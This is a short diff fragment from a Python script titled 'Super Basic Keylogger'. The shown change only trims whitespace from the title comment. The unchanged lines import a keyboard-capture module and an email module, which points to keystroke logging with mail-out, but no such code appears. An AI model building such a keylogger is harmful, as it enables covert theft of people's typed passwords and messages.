@@ -1,4 +1,4 @@
-#Super Basic Keylogger 
+#Super Basic Keylogger
 
 import keyboard 
 import smtplib 
